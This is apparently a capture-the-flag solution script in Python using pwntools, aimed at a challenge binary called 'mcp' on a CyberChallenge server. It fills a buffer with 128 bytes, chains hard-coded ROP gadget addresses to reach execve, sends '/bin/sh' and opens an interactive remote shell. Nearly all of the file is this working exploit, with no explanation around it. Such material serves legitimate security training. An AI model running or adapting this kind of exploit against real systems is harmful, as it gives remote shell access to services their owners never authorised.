from pwn import *

exe = ELF("mcp")
context.binary = exe
HOST = "mcp.challs.cyberchallenge.it"
PORT = 6023
p = remote(HOST, PORT)

POP_RSI = 0x0400159  # Address found with ropper
STRING = 0x060016c  # Address found with ropper
READ = 0x0400138  # Address found with ropper
POP_R10 = 0x0400153  # Address found with ropper
EXIT = 0x040015b  # Address found with ropper
# building the ROPchain
chain = (
        b'A' * 128 +
        p64(POP_RSI) +  # pop rsi
        p64(STRING) +  # string
        p64(READ) +  # read
        p64(POP_R10) +  # pop r10 ....
        p64(STRING) +  # string
        p64(EXIT)  # exit
)

p.sendline(chain)
p.sendline('/bin/sh\x00')  # because we have replaced the "gets" with "execve" we need to send the command to execute
p.interactive()
